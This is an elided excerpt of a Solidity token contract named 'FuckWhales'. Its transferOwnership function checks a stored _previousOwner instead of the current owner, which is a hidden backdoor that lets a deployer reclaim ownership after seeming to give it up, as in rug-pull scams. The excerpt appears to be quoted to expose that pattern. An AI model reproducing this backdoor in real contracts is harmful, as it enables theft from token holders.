...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        require(_previousOwner == msg.sender, "You're not that guy, trust me, you're not that guy");
...
contract FuckWhales is Context, IERC20, Ownable {
    ...
    string private _name = "FuckWhales";
